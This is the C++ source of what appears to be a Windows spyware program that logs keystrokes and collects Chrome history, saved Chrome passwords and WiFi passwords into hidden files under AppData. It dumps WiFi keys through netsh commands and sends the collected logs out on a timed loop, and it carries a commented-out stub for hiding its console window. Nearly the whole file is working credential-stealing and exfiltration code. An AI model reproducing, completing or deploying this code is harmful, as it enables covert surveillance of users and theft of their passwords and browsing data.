#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <fstream>
#include <sys/stat.h>
#include "sqlite/sqlite3.h"
#include <cstdlib>
#include <winsock.h>
#include <thread>
#include <ctime>
#include <chrono>
#include <cstdio>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>
#include <sstream>
#include <Wincrypt.h>
#include <rapidjson/document.h>
#include <openssl/evp.h>
#include <wtypes.h>
#include <iomanip>
#include <vector>
#include <curl/curl.h>
#include "winmon.h"

using namespace std;
using namespace rapidjson;

string g_key_press_logfile;
string g_chrome_history_logfile;
string g_chrome_last_time_logfile;
string g_chrome_passwd_logfile;
string g_wifi_passwd_logfile;
string g_chrome_data_dir;

string g_last_history_time = "01-01-1970 00:00:00"; 
string g_hostname;
string g_username;
string g_local_key;
string g_unique_identifier;

#define EXFILTRATE_INTERVAL_CHECK_VALUE 1 //Number of minutes between file exfiltrate interval checks

string exec(string cmd) {
    array<char, 1000> buffer;
    string result;
    unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd.c_str(), "r"), pclose);
    if (!pipe) {
        throw runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}


void printHexadecimal(const string& str) {
    for (char c : str)
    {
        std::cout << "0x" << std::setfill('0') << std::setw(2) << std::hex << (int)c << " ";
    }
    std::cout << std::endl;
}


string base64_decode(string encoded_string)
{
    cout << "b64 Decode: " << encoded_string << endl;
    vector<int> T(256, -1);
    for (int i = 0; i < 64; i++) T["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[i]] = i;
    string decoded_string;
    int val = 0, valb = -8;

    for (unsigned char c : encoded_string) {
        if (T[c] == -1) break;
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0) {
            decoded_string.push_back(char((val >> valb) & 0xFF));
            valb -= 8;
        }
    }

    return decoded_string;
}


void delete_files() {
    cout << "TODO DELETE ALL FILES" << endl;
}


void exfiltrate_files() {
    exfil_file_log("keylog", g_key_press_logfile);   
    exfil_file_log("chrome_history", g_chrome_history_logfile);   
    exfil_file_log("chrome_passwords", g_chrome_passwd_logfile);   
    delete_files();
}


void exfiltrate_files_interval_check() {
    exfiltrate_files();
    auto start_time = std::chrono::system_clock::now();
    while (true) {
        auto current_time = std::chrono::system_clock::now();
        auto diff = current_time - start_time;
        int diff_value = std::chrono::duration_cast<std::chrono::seconds>(diff).count();
        if (diff_value >= EXFILTRATE_INTERVAL_CHECK_VALUE*60) {
            exfiltrate_files();
            start_time = std::chrono::system_clock::now();
        }
    }
}


void get_saved_ssids_and_passwords() {
    const char* get_all_profiles = "netsh wlan show profile | findstr /r /s /i /m /c:\"\\<Profile\\>\"";
    char *out = (char*)exec(get_all_profiles).c_str();
    stringstream ss(out);
    string to;
    if (out != NULL) {
        ofstream myfile;
        myfile.open(g_wifi_passwd_logfile, ios_base::app);
        while(std::getline(ss,to,'\n')){
            try {
                string ssid = to.substr(to.find(" : ")+3, to.length());
                string get_profile_password = "netsh wlan show profile name=\"" + ssid + "\" key=clear | findstr \"Content\"";
                string out2 = exec(get_profile_password.c_str());
                string passwd = out2.substr(out2.find(" : ")+3, out2.length());    
                string output = ssid + "\t\t" + passwd;
                myfile << output + "\n";
            } catch (...) {}          
        }

        myfile.close();

    }
}


void get_unique_identifier() {
    g_unique_identifier = g_username + "-" + g_hostname;
}


void get_computer_stats() {
    long unsigned int hostname_len = MAX_COMPUTERNAME_LENGTH + 1;
    long unsigned int username_len = 257;
    char hostname[hostname_len];    
    char username[username_len];
    GetComputerNameExA((COMPUTER_NAME_FORMAT)0, hostname, &hostname_len);
    GetUserNameA(username, &username_len);
    g_hostname = string(hostname);
    g_username = string(username);

    get_unique_identifier();
}


void setup_fs() {
    get_computer_stats();
    
    string log_dir = "C:\\Users\\"+g_username+"\\AppData\\Local\\Windows\\";
    const char* path = log_dir.c_str();
    int retval = mkdir(path);

    g_key_press_logfile = log_dir + "key.log";
    g_chrome_history_logfile = log_dir + "chrome_history.log";
    g_chrome_last_time_logfile = log_dir + "chrome_last_time.log";
    g_chrome_passwd_logfile = log_dir + "chrome_passwords.log";
    g_wifi_passwd_logfile = log_dir + "wifi_passwords.log";
    g_chrome_data_dir = "C:\\Users\\"+g_username+"\\AppData\\Local\\Google\\Chrome\\User Data\\";

}


//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
//    FreeConsole();
int main() {
    setup_fs();
    //get_saved_ssids_and_passwords();
    // thread th1(chrome_history_interval_check);
    // thread th2(detect_key_press);
    // thread th3(chrome_password_interval_check);
    thread th4(heartbeat);
    // thread th5(exfiltrate_files);
    // th1.join();
    // th2.join();
    // th3.join();
 th4.join();
    // th5.join();    
    return 0;
}
